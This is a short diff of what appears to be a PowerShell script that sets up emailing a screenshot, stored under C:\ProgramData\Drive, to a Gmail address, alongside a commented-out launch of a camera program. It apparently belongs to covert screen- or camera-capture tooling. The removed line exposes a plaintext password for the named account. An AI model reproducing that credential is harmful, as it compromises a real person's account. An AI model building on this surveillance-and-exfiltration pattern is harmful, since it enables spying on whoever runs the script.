@@ -4,7 +4,7 @@
 #start-process -FilePath "C:\ProgramData\Drive\files\camera\cmd cam.exe"
 $date = Get-date 
 $Username = "jonadabbanks@gmail.com";
-$Password = "LB0jSfszVG6DAkNx";
+$Password = "";
 $path = "C:\ProgramData\Drive\Files\Screen.png";
 $EmailTo = "jonadabbanks@gmail.com"
 
